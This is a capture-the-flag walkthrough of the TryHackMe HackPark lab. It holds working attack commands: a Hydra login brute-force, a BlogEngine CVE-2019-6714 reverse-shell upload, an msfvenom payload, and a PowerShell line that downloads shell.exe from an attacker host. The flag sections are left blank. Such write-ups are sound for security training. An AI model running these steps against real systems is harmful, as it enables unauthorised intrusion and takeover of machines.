# [HackPark - TryHackMe](https://tryhackme.com/room/hackpark)

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

## Credits

- Created by [tryhackme](https://tryhackme.com/p/tryhackme) and [str3g4tt4](https://tryhackme.com/p/str3g4tt4)
- Room type: premium

## Deploy the vulnerable Windows machine

- `nmap -sV <target ip>` to see which port the web server is hosted on

### Whats the name of the clown displayed on the homepage?

> The name of the clown on the homepage is **pennywise**

## Using Hydra to brute-force a login

### What request type is the Windows website login form using?

- Using a proxy in BurpSuite or web browser, capture sign in request

> The login form uses an HTTP **POST** request

### Guess a username, choose a password wordlist and gain credentials to a user account!

- The raw request (using demo credentials admin:password) is:

```
__VIEWSTATE=mxGh%2BdQ%2F%2BpArh2IP5hEYlvCLap4USWw8NMWpW%2FCdFy6ebKKcxpebQBn520XB%2B2JT4UkTMLEKXBo45EPGoXJV66%2Burs2DXjDhcW1YOsSeJnTn%2FUSqN83X99YkfN%2Bj1wq5fZmYNARCiCOdguXEK4cGaW9Pk0uvyRYkE0%2FL8raUHPQvtxFy&__EVENTVALIDATION=1c2yh3maTjYr195e6nm19EPl0ltYHdCSj3UZlOmOgjsz1oiEzPAjPecO6Jz8lbmApBJaNxurYq2wLuHkXw6ucLOBRfCJKpDlcLjTKIDntLkWs7k7pMPaNyTNTqVsxWqgWyjwK2l3PhC7LG85PlYneTsJw1hRDr2IIximKRT0VfChSgfb&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=password&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

- Craft Hydra command with the request
    - `hydra -l admin -P /usr/share/wordlists/rockyou.txt <target ip> http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=mxGh%2BdQ%2F%2BpArh2IP5hEYlvCLap4USWw8NMWpW%2FCdFy6ebKKcxpebQBn520XB%2B2JT4UkTMLEKXBo45EPGoXJV66%2Burs2DXjDhcW1YOsSeJnTn%2FUSqN83X99YkfN%2Bj1wq5fZmYNARCiCOdguXEK4cGaW9Pk0uvyRYkE0%2FL8raUHPQvtxFy&__EVENTVALIDATION=1c2yh3maTjYr195e6nm19EPl0ltYHdCSj3UZlOmOgjsz1oiEzPAjPecO6Jz8lbmApBJaNxurYq2wLuHkXw6ucLOBRfCJKpDlcLjTKIDntLkWs7k7pMPaNyTNTqVsxWqgWyjwK2l3PhC7LG85PlYneTsJw1hRDr2IIximKRT0VfChSgfb&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:failed"`

> 1 valid password is found: **1qaz2wsx**

## Compromise the machine

### Now you have logged into the website, are you able to identify the version of the BlogEngine?

> The BlogEngine version is **3.3.6.0**

### What is the CVE?

> A quick google search of the BlogEngine version returns **CVE-2019-6714**

### Who is the webserver running as?

- First, set the reverse shell IP in the exploit code
    - Edit this line: `System.Net.Sockets.TcpClient("10.10.10.20", 4445))`
- Rename the file to PostView.ascx
- Upload to blogengine portal
    - Use this link: http://<target ip>/admin/app/editor/editpost.cshtml
- Trigger uploaded exploit
    - Use this link: http://<target ip>/?theme=../../App_Data/files

> <code>whoami</code> returns **iis apppool\blog**

## Windows Privilege Escalation

### What is the OS version of this windows machine?

- Generate shellcode with `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe`
- Transport the shell to target machine
    - `python3 -m http.server 8081` to share out all files in current directory
    - `powershell.exe -Command "Invoke-WebRequest -Uri http://<attack ip>:<port>/shell.exe -OutFile shell.exe"` to download from the http server

> <code>systeminfo</code> returns shows the OS version is **Windows 2012 R2 (6.3 Build 9600)**

### Can you spot a service running some automated task that could be easily exploited? What is the name of this service?

#### Output of exploit suggester:

```
#   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

- Automated tasks are likely carried out in Windows' task scheduler
- Check in `C:\Program Data (x86)`
    - *SystemScheduler* folder contains list of binaries
        - *Events* folder contains logs
        - `type 20198415519.INI_LOG.txt` to view contents of log
        - *Message.exe* seems to be run very frequently as Administrator

> The service running automated tasks is **WindowsScheduler**

### What is the name of the binary you're supposed to exploit?

> The binary being run as Administrator in the logs is **Message.exe**

### What is the user flag?

- 

### What is the root flag?